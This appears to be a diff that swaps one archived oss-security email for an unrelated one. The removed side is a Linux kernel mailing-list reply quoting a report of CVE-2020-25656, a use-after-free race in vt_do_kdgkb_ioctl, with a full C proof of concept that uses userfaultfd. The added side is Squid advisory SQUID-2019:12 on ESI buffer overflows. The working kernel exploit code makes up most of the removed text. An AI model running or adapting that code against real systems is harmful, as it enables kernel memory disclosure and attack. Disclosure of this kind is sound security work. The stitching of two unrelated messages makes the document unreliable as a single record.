@@ -1,240 +1,145 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/16/3
-Message-ID: <09826e03-525c-d307-5bfe-f51cb9298e1f@kernel.org>
-Date: Fri, 16 Oct 2020 08:58:34 +0200
-From: Jiri Slaby <jirislaby@...nel.org>
-To: Minh Yuan <yuanmingbuaa@...il.com>, oss-security@...ts.openwall.com, Greg KH <gregkh@...uxfoundation.org>, Linux kernel mailing list <linux-kernel@...r.kernel.org>
-Subject: Re: CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/04/23/1
+Message-ID: <0869cb33-611f-1baa-e76f-f3bff5e52168@treenet.co.nz>
+Date: Thu, 23 Apr 2020 21:02:54 +1200
+From: Amos Jeffries <squid3@...enet.co.nz>
+To: oss-security@...ts.openwall.com
+Subject: [ADVISORY] SQUID-2019:12 Multiple issues in ESI Response processing
 Content-Type: text/plain; charset=utf-8
 
-Cc Greg.
+__________________________________________________________________
 
-On 16. 10. 20, 5:39, Minh Yuan wrote:
-> Hi,
-> 
-> We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
-> version 3.4 to the latest version (v5.9 for now).
-> 
-> The root cause of this vulnerability is that there exits a race in
-> KDGKBSENT and KDSKBSENT.
-> 
-> Here are details:
-> 1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
-> 2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
-> func_table, at the same time, due to KDGKBSENT has no lock, we can use
-> KDSKBSENT again to allocate a larger buffer than step1, and the old
-> funcbufptr will be freed. However, we've obtained the heap pointer in
-> KDGKBSENT, so a uaf read will happen while executing put_user.
+    Squid Proxy Cache Security Update Advisory SQUID-2019:12
+__________________________________________________________________
 
-Hi,
+Advisory ID:        SQUID-2019:12
+Date:               April 23, 2020
+Summary:            Multiple issues
+                    in ESI Response processing.
+Affected versions:  Squid 3.x -> 3.5.28
+                    Squid 4.x -> 4.10
+                    Squid 5.x -> 5.0.1
+Fixed in version:   Squid 4.11 and 5.0.2
+__________________________________________________________________
 
-this is likely the issue I am fixing at:
-https://git.kernel.org/pub/scm/linux/kernel/git/jirislaby/linux.git/commit/?h=devel&id=57c85191e788e172a446e34ef77d34473cfb1e8d
+    http://www.squid-cache.org/Advisories/SQUID-2019_12.txt
+    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12519
+    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12521
+__________________________________________________________________
 
-I think, it won't apply cleanly as it's a part of a larger set. I will 
-reorder the patch and send something during the day.
+Problem Description:
 
-Thanks.
+ Due to incorrect buffer handling Squid is vulnerable to cache
+ poisoning, remote execution, and denial of service attacks when
+ processing ESI responses.
 
-> I've successfully reproduced this bug in a special way.
-> However, to write a universal PoC for anyone else to reproduce it,  I use
-> userfaultfd to handle the order of "free" and "use" in multithreading
-> environment. This is my PoC:
-> 
-> // author by ziiiro@thu
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <unistd.h>
-> #include <sys/ioctl.h>
-> #include <string.h>
-> #include <sys/types.h>
-> #include <sys/stat.h>
-> #include <fcntl.h>
-> #include <sys/mman.h>
-> #include <poll.h>
-> #include <pthread.h>
-> #include <errno.h>
-> #include <stdlib.h>
-> #include <signal.h>
-> #include <string.h>
-> #include <sys/syscall.h>
-> #include <linux/userfaultfd.h>
-> #include <pthread.h>
-> #include <poll.h>
-> #include <linux/prctl.h>
-> #include <stdint.h>
-> 
-> #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
->                         } while (0)
-> 
-> #define KDGKBSENT 0x4B48 /* gets one function key string entry */
-> #define KDSKBSENT 0x4B49 /* sets one function key string entry */
-> 
-> struct kbsentry {
-> unsigned char kb_func;
-> unsigned char kb_string[512];
-> };
-> int fd;
-> static int page_size;
-> static void *fault_handler_thread(void *arg) {
->    unsigned long value;
->    static struct uffd_msg msg;
->    static int fault_cnt = 0;
->    long uffd;
->    static char *page = NULL;
->    struct uffdio_copy uffdio_copy;
->    int len, i;
->    if (page == NULL) {
->      page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
->                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
->      if (page == MAP_FAILED) errExit("mmap (userfaultfd)");
->    }
->    uffd = (long)arg;
-> 
->    for(;;) {
->      struct pollfd pollfd;
->      pollfd.fd = uffd;
->      pollfd.events = POLLIN;
->      len = poll(&pollfd, 1, -1);
-> 
-> 
->      read(uffd, &msg, sizeof(msg));
->      printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
->      printf("    address = 0x%lx\n", msg.arg.pagefault.address);
->      switch(fault_cnt) {
->          case 0:
->              puts("triggered in the first page!");
->              break;
->          case 1:
->              puts("triggered in the seccond page!");
->              munmap((void*)0x233000,page_size);
->              void *addr = (void*)mmap((void*)0x233000,
->                          page_size,
->                          PROT_READ | PROT_WRITE,
->                          MAP_FIXED | MAP_PRIVATE | MAP_ANON,
->                          -1, 0);
->              if ((unsigned long)addr != 0x233000)
->                  errExit("mmap (0x233000)");
->              // register 0x233000 again to trigger put_user
->              struct uffdio_register uffdio_register;
->              uffdio_register.range.start = (unsigned long)addr;
->              uffdio_register.range.len   = page_size;
->              uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
->              if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
->                  errExit("ioctl: UFFDIO_REGITER");
->              break;
->          case 2:
->              puts("triggered in put_user!");
->              struct kbsentry *kbs;
->              kbs = malloc(sizeof(struct kbsentry));
->              kbs->kb_func = 0;
-> 
-> strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbb");
->              // free old funcbufptr
->              ioctl(fd,KDSKBSENT,kbs);
->              break;
-> 
->      }
->      // return to kernel-land
->      uffdio_copy.src = (unsigned long)page;
->      uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
-> ~(page_size - 1);
->      uffdio_copy.len = page_size;
->      uffdio_copy.mode = 0;
->      uffdio_copy.copy = 0;
->      if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
->          errExit("ioctl: UFFDIO_COPY");
-> 
->      fault_cnt++;
-> 
->    }
-> }
-> // use userfaultfd to handle free->use
-> void setup_pagefault(void *addr, unsigned size) {
->    long uffd;
->    pthread_t th;
->    struct uffdio_api uffdio_api;
->    struct uffdio_register uffdio_register;
->    int s;
->    // new userfaulfd
-> 
->    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
->    if (uffd == -1) errExit("userfaultfd");
->    // enabled uffd object
->    uffdio_api.api = UFFD_API;
->    uffdio_api.features = 0;
->    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) errExit("ioctl:
-> UFFDIO_API");
->    // register memory address
->    uffdio_register.range.start = (unsigned long)addr;
->    uffdio_register.range.len   = size;
->    uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
-> //UFFDIO_REGISTER_MODE_WP;//
->    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) errExit("io=
-> ctl:
-> UFFDIO_REGITER");
->    // monitor page fault
->    s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
->    if (s != 0) errExit("pthread_create");
-> }
-> 
-> 
-> int main(int argc, char** argv)
-> {
->          struct kbsentry *kbs;
->          pthread_t th;
->          page_size = sysconf(_SC_PAGE_SIZE);
->          void *addr = (void*)mmap((void*)0x233000,
->                              page_size * 2,
->                              PROT_READ | PROT_WRITE,
->                              MAP_FIXED | MAP_PRIVATE | MAP_ANON,
->                              -1, 0);
->          if ((unsigned long)addr != 0x233000)
->              errExit("mmap (0x233000)");
->          setup_pagefault(addr, page_size * 2);
->          kbs = malloc(sizeof(struct kbsentry));
->          kbs->kb_func = 0;
->          fd = open("/dev/tty1", O_RDONLY, 0);
-> 
-> strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
-> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
-> a");
->          // allocate a lager funcbufptr
->          ioctl(fd,KDSKBSENT,kbs);
->          // use KDGKBSENT to access the new funcbufptr
->          ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
->          return 1;
-> 
-> }
-> 
-> Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=y
-> is also needed. Besides, it needs the privilege to access tty to trigger
-> this bug.
-> 
-> We've noticed that this bug was also discovered by Syzbot 8 months ago, but
-> no one has successfully reproduced it (
-> https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
-> leaving this issue ignored and upatched yet. Hope this PoC can help
-> someone.
-> 
-> Timeline:
-> * 10.15.20 - Vulnerability reported to security@...nel.org and
-> linux-distros@...openwall.org.
-> * 10.15.20 - CVE-2020-25656 assigned.
-> * 10.16.20 - Vulnerability opened.
-> 
-> Thanks,
-> Yuan Ming and Bodong Zhao, Tsinghua University
-> 
+__________________________________________________________________
+
+Severity:
+
+ These problems allow a remote server delivering certain ESI
+ response syntax to trigger a buffer overflow.
+
+ On systems with heap overflow protection overflow will shutdown
+ the proxy causing a denial of service for all clients accessing
+ the Squid service.
+
+ On systems with ESI buffer pooling (the default) overflow will
+ truncate portions of generated payloads. Poisoning the HTTP
+ response cache with corrupted objects.
+
+ The CVE-2019-12519 issue also overwrites arbitrary attacker
+ controlled information onto the process stack. Allowing remote
+ code execution with certain crafted ESI payloads.
+
+ These problems are restricted to ESI responses received from an
+ upstream server. Attackers have to compromise the server or
+ transmission channel to utilize these vulnerabilities.
+
+__________________________________________________________________
+
+Updated Packages:
+
+ This bug is fixed by Squid versions 4.11 and 5.0.2.
+
+ In addition, patches addressing this problem for the stable
+ releases can be found in our patch archives:
+
+Squid 4:
+ <http://www.squid-cache.org/Versions/v4/changesets/squid-4-fdd4123629320aa1ee4c3481bb392437c90d188d.patch>
+
+ If you are using a prepackaged version of Squid then please refer
+ to the package vendor for availability information on updated
+ packages.
+
+__________________________________________________________________
+
+Determining if your version is vulnerable:
+
+ All Squid-2.x are not vulnerable.
+
+ All Squid built with --disable-esi are not vulnerable.
+
+ All Squid-3.0 versions built without --enable-esi are not
+ vulnerable.
+
+ All Squid-3.x versions built with --enable-esi are vulnerable.
+
+ All Squid-4.x up to and including Squid-4.10 are vulnerable.
+
+ Squid-5.0.1 is not vulnerable to the CVE-2019-12519 remote code
+ execution issue.
+
+ Squid-5.0.1 is vulnerable to the CVE-2019-12521 issues.
+
+__________________________________________________________________
+
+Workaround:
+
+ Build Squid with --disable-esi
+
+__________________________________________________________________
+
+Contact details for the Squid project:
+
+ For installation / upgrade support on binary packaged versions
+ of Squid: Your first point of contact should be your binary
+ package vendor.
+
+ If your install and build Squid from the original Squid sources
+ then the squid-users@...ts.squid-cache.org mailing list is your
+ primary support point. For subscription details see
+ <http://www.squid-cache.org/Support/mailing-lists.html>.
+
+ For reporting of non-security bugs in the latest STABLE release
+ the squid bugzilla database should be used
+ <http://bugs.squid-cache.org/>.
+
+ For reporting of security sensitive bugs send an email to the
+ squid-bugs@...ts.squid-cache.org mailing list. It's a closed
+ list (though anyone can post) and security related bug reports
+ are treated in confidence until the impact has been established.
+
+__________________________________________________________________
+
+Credits:
+
+ This vulnerability was discovered by Jeriko One
+ <jeriko.one@....us>.
+
+ Fixed by Amos Jeffries of Treehouse Networks Ltd.
+
+__________________________________________________________________
+
+Revision history:
+
+ 2019-05-14 14:56:49 UTC Initial Report
+ 2019-05-20 11:23:13 UTC Patches Released
+ 2019-06-05 15:52:17 UTC CVE Assignment
+ 2020-04-23 08:00:00 UTC Advisory Released
+__________________________________________________________________
+END
 
 
--- 
-js
-suse labs
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
